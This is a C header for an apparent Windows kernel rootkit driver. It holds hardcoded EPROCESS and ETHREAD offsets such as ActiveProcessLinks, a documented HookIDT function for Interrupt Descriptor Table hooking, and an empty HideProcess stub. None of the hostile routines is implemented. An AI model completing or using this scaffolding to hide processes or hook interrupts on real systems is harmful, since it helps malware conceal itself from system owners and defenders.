/*+===================================================================
  File:      RootKit.h

  Summary:   Structures and functions used in the Root Kit driver.

  Author:    idchoppers
  Date:      2/22/2024
===================================================================+*/
#pragma once

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#define ROOTKIT_DEVICE 0x8000
#define IOCTL_ROOTKIT_SET_PRIORITY CTL_CODE (ROOTKIT_DEVICE, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

#define DRIVER_TAG 8437580

struct ThreadData
{
	DWORD ProcID;
};

struct EprocessOffsets
{
	DWORD64 UniqueProcessId = 0x440;
	DWORD64 ActiveProcessLinks = 0x448;
	DWORD64 ThreadListHead = 0x5e0;
};

struct EthreadOffsets
{
	DWORD64 Cid = 0x4c8;
};

/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
  Function: HookIDT

  Summary:  Hooks the Interrupt Descriptor Table for ISR 
			manipulation.

  Args:		UINT16 service
				The ISR to manipulate.
			UINT32 hookAddress
			  The address to the hooked function.
F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/


/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
  Function: HideProcess

  Summary:  Hides a running process.

  Args:     PEPROCESS target
			  An EPROCESS to hide.
F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/
void
HideProcess(PEPROCESS target)
{
}